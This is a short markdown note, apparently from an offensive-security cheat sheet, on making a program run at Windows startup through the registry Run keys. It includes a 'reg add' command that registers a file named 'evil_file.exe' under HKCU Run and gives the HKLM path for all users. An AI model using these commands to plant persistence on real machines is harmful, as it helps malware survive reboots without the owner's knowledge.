## Executing after reboot for Windows Machines

* Introducion:
<pre>
1. Win + R -> regedit 
2. HKEY_CURRENT_USER -> Software -> Microsoft -> Windows -> CurrentVersion -> Run
3. In there we can add our command
</pre>
* How to do it in command promt(cmd or powershell):
<pre>
1. reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {Name} /t {Type} /d {PATH_TO_EVIL_FILE}
2. Example: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "C:\evil_file.exe"
</pre>

* In addition:
<pre>
For all users in current machine : HKEY_LOCAL_MACHINE -> SOFTWARE -> Microsoft -> Windows -> CurrentVersion -> Run
</pre>